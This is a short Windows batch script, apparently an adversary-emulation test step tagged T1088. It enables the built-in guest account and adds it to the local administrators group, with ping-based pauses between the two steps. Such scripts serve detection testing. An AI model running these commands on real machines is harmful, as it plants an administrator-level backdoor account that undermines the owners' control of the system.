@ECHO OFF

ECHO ===========================================================================
ECHO GUEST USER
ECHO Activating guest user account add as admin - T1088
ping -n 3 127.0.0.1 > NUL

net user guest /active:yes

ECHO Adding the guest user to the local administrators group
ping -n 3 127.0.0.1 > NUL

net localgroup administrators guest /ADD
